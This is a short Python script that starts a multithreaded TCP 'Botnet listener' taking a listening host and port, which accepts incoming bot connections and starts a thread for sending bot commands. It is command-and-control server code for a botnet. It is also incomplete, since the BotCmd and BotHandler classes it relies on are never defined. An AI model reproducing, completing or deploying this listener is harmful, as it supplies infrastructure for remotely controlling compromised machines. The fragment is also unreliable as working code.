#!/usr/bin/python3

import socket  # import socket library
import sys  # import system library for parsing arguments
import os  # import os library to call exit and kill threads
import threading  # import threading library to handle multiple connections
import queue  # import queue library to handle threaded data

q = queue.Queue()
Socketthread = []


def main():
    if len(sys.argv) < 3:
        print(
            "[!] Usage:\n  [+] python3 "
            + sys.argv[0]
            + " <LHOST> <LPORT>\n  [+] Eg.: python3 "
            + sys.argv[0]
            + " 0.0.0.0 8080\n"
        )
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost, lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")


def listener(lhost, lport, q):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(100)

    print("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
    BotCmdThread = BotCmd(q)
    BotCmdThread.start()
    while True:
        (client, client_address) = server.accept()
        newthread = BotHandler(client, client_address, q)
        Socketthread.append(newthread)
        newthread.start()


if __name__ == "__main__":
    main()
